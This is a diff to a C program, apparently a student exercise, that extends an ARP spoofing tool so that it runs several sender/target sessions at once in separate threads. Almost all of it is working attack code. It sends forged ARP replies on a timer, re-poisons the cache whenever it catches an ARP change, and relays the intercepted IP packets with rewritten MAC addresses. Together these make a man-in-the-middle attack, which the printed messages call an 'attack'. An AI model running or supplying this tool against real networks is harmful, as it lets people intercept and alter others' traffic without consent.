@@ -29,11 +29,19 @@ struct arp_packet{
 };
 #pragma pack(pop)
 
-struct THREAD_DATA{
+struct THREAD_DATA{									// struct for arguments of infection thread
 	pcap_t * _fp;
 	unsigned int * _status;
 	unsigned int _time_interval;
 	struct arp_packet * _packet;
+	int _th_num;
+};
+
+struct SESSION_DATA{
+        unsigned int * _status;
+        unsigned int _time_interval;
+        char *_argv[3];
+	int _th_num;
 };
 
 int getMacAddress(uint8_t * my_mac, char * interface)
@@ -220,68 +228,61 @@ void get_mac_addr(	uint8_t result_ether_addr[], struct in_addr * result_ip, stru
         }
 }
 
-void *t_arp_infection(void *th_data)
+void *t_arp_infection(void *th_data)								// function for infection thread
 {
 	pcap_t *fp;
 	unsigned int *status, time_interval;
 	struct arp_packet * packet;
+	int th_num;
 	struct THREAD_DATA * arg = (struct THREAD_DATA *)th_data;
 	fp = arg->_fp;
 	status = arg->_status;
 	time_interval = arg->_time_interval;
 	packet = arg->_packet;
-	
+	th_num = arg->_th_num;
+
+	printf("#%d ", th_num);	
 	print_packet(packet);
 	
 	while(*status)
 	{	
-		if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(arp_packet)))                    // send packet
+		if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(arp_packet)))          	// send packet
         	{
                 	fprintf(stderr, "\nError sending the packet\n");
 	                exit(0);
         	}
-	        printf("--------arp infection--------\n");	
+	        printf("--------arp infection--------#%d\n", th_num);	
 
 		sleep(time_interval);
 	}
-	printf("[*] arp infection stoped!!\n");
+	printf("[*] #%d arp infection stoped [*]\n", th_num);
 }
 
-void * t_check_stop(void * th_data)
+void * t_make_session(void * main_th_data)
 {
-	unsigned int *status;
-	status = (unsigned int *)th_data;
-	char buff[10];
-	char STOP[10] = "STOP";
-	while(1)
-	{
-		scanf("%s", buff);
-		if(strcmp(STOP, buff)==0) break; 
-	}
-	*status = 0;
-}
+	unsigned int *status, time_interval;
+	char * argv[3];
+	int th_num;
+	struct SESSION_DATA * arg = (struct SESSION_DATA *)main_th_data;
+	status = arg->_status;
+	time_interval = arg->_time_interval;
+	argv[0] = arg->_argv[0];
+	argv[1] = arg->_argv[1];
+	argv[2] = arg->_argv[2];
+	th_num = arg->_th_num;
 
-int main(int argc, char* argv[])
-{	
 	pcap_t *fp;
-	char* dev = argv[1];
+	char* dev = argv[0];
 	char errbuf[PCAP_ERRBUF_SIZE];
 	fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (fp == NULL) {
     		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
-		return -1;
+		exit(0);
 	}
-	if (argc < 4 || argc %2 == 1){
-		printf("Error, give me correct arguments\n");
-		return -1;
-	}
-	pthread_t p_infection_th, p_check_th;
+	
+	pthread_t p_infection_th;
 	int thr_id;
 	struct THREAD_DATA th_data;
-	unsigned int status = 1;
-	unsigned int time_interval;
-	printf("Give me arp infection time interval(sec) : ");
-	scanf("%d", &time_interval);
 
 	uint8_t my_mac[ETHER_ADDR_LEN], sender_mac[ETHER_ADDR_LEN], target_mac[ETHER_ADDR_LEN];
 	struct in_addr * my_ip, *sender_ip, *target_ip;
@@ -297,14 +298,20 @@ int main(int argc, char* argv[])
 	uint16_t arp_pro_type =ETHERTYPE_IP;							// IPv4	: 0x0800
 	uint16_t arp_opcode = ARPOP_REQUEST;							// request : 0x0001
 	
-	getMacAddress(my_mac, argv[1]);								// get my mac, ip
-	getIpAddress(my_ip, argv[1]);
-	inet_aton(argv[2], sender_ip);								// get sender ip
-	inet_aton(argv[3], target_ip);								// get target ip
+	getMacAddress(my_mac, dev);								// get my mac, ip
+	getIpAddress(my_ip, dev);
+	inet_aton(argv[1], sender_ip);								// get sender ip
+	inet_aton(argv[2], target_ip);								// get target ip
 
 	get_mac_addr(sender_mac, sender_ip, my_ip, fp, packet, my_mac, ether_type, arp_hrd_type, arp_pro_type, arp_opcode);
+	sleep(1);
 	get_mac_addr(target_mac, target_ip, my_ip, fp, packet, my_mac, ether_type, arp_hrd_type, arp_pro_type, arp_opcode);
-	printf("--------sender mac, target mac get!--------\n");
+	printf("--------sender mac, target mac get!--------#%d\n", th_num);
+	sleep(1);	
+	
+	printf("#%d target mac : %02x %02x %02x %02x %02x %02x\n", th_num,
+         	target_mac[0],	target_mac[1],	target_mac[2],	target_mac[3],	target_mac[4],	target_mac[5]);
+
 
 	arp_opcode = ARPOP_REPLY;								// reply : 2
 	make_arp_packet(packet, sender_mac, my_mac, ether_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
@@ -315,21 +322,12 @@ int main(int argc, char* argv[])
 //	print_packet(packet);	
 
 	th_data._fp = fp;
-	th_data._status = &status;
+	th_data._status = status;
 	th_data._time_interval = time_interval;
 	th_data._packet = th_packet;
-
-	printf("--------arp spoofing start!, type 'STOP' when you want to stop this attack--------\n");
+	th_data._th_num = th_num;
 	
-	thr_id = pthread_create(&p_check_th, NULL, t_check_stop, (void *)&status);
-	if (thr_id < 0)
-	{
-		perror("thread create error : ");
-        	exit(0);
-    	}
-	pthread_detach(p_check_th);
-
-	thr_id = pthread_create(&p_infection_th, NULL, t_arp_infection, (void *)&th_data);
+	thr_id = pthread_create(&p_infection_th, NULL, t_arp_infection, (void *)&th_data);	// infection thread
         if (thr_id < 0)
         {
                 perror("thread create error : ");
@@ -337,7 +335,7 @@ int main(int argc, char* argv[])
         }
 	pthread_detach(p_infection_th);
 	
-	while (status){
+	while (*status){
                 struct pcap_pkthdr* header;
                 struct libnet_ethernet_hdr* ETH_header;
 		struct libnet_ipv4_hdr* IP_header;
@@ -352,9 +350,9 @@ int main(int argc, char* argv[])
                       	if(pcap_sendpacket(fp, (unsigned char *)th_packet, sizeof(arp_packet)))	// send packet
         		{
                 		fprintf(stderr, "\nError sending the packet\n");
-		                return -1;
+		                exit(0);
 		        }
-		        printf("--------arp infection! by catching arp-table change--------\n");	 
+//		        printf("--------arp infection! by catching arp-table change--------\n");	 
 			continue;
 		}
 		else if (ntohs(ETH_header->ether_type) == ETHERTYPE_IP){
@@ -370,24 +368,84 @@ int main(int argc, char* argv[])
 				memcpy(ETH_header->ether_dhost, target_mac, ETHER_ADDR_LEN);
 				memcpy(ETH_header->ether_shost, my_mac, ETHER_ADDR_LEN);
 				rcv_packet -= sizeof(struct libnet_ethernet_hdr);
-				if(pcap_sendpacket(fp, (unsigned char *)rcv_packet, header->caplen)) // relay packet
+				if(pcap_sendpacket(fp, (unsigned char *)rcv_packet, header->caplen)) 				// relay packet
 	                        {
         	                        fprintf(stderr, "\nError sending the packet\n");
-                	                return -1;
+                	                exit(0);
                         	}
-	                        printf("--------Send Relay IP Packet!--------\n");
+	                        printf("--------Send Relay IP Packet!--------#%d\n", th_num);
+				printf("#%d dest mac : %02x %02x %02x %02x %02x %02x\n", th_num,
+					ETH_header->ether_dhost[0], ETH_header->ether_dhost[1], ETH_header->ether_dhost[2], 
+					ETH_header->ether_dhost[3], ETH_header->ether_dhost[4], ETH_header->ether_dhost[5]);
+				printf("#%d src  mac : %02x %02x %02x %02x %02x %02x\n", th_num,
+					ETH_header->ether_shost[0], ETH_header->ether_shost[1], ETH_header->ether_shost[2], 
+					ETH_header->ether_shost[3], ETH_header->ether_shost[4], ETH_header->ether_shost[5]);
 			}
 		}
         }
-
-	sleep(time_interval);
+	sleep(time_interval+1);
 
 	free(my_ip);
 	free(sender_ip);
 	free(target_ip);
 	free(packet);
 	free(th_packet);
-	printf("--------Successful Program End--------\n");
 	
+	printf("[*] Successful Session #%d Thread End [*]\n", th_num);
+}
+
+int main(int argc, char* argv[])
+{	
+	char buff[10];
+        char STOP[10] = "STOP";
+
+	int session_cnt = 1, i;
+	if (argc < 4 || argc %2 == 1){
+		printf("Error, give me correct arguments\n");
+		return -1;
+	}
+	session_cnt = argc/2 -1;
+	pthread_t p_session_th[session_cnt];
+	int thr_id;
+	struct SESSION_DATA th_data[session_cnt];
+	unsigned int status = 1;
+	unsigned int time_interval;
+	printf("Give me arp infection time interval(sec) : ");
+	scanf("%d", &time_interval);
+
+	for(i=0; i<session_cnt; i++)
+	{
+		th_data[i]._status = &status;
+		th_data[i]._time_interval = time_interval;
+		th_data[i]._argv[0] = argv[1];
+		th_data[i]._argv[1] = argv[i*2+2];
+		th_data[i]._argv[2] = argv[i*2+3];
+		th_data[i]._th_num = i+1;
+	}	
+
+	printf("--------arp spoofing start!, type 'STOP' when you want to stop this attack--------\n");
+	for(i=0; i<session_cnt; i++)
+	{
+		thr_id = pthread_create(&p_session_th[i], NULL, t_make_session, (void *)&(th_data[i]));		
+		if (thr_id < 0)
+		{
+			perror("thread create error : ");
+	        	exit(0);
+	    	}
+		pthread_detach(p_session_th[i]);
+		printf("--------make session #%d--------\n", i+1);
+	}
+	
+	while(1)
+        {
+                scanf("%s", buff);
+                if(strcmp(STOP, buff)==0) break;
+        }
+        status = 0;
+
+	sleep(time_interval+2);
+
+	printf("[*] Successful Program End [*]\n");
+
 	return 0;
 }
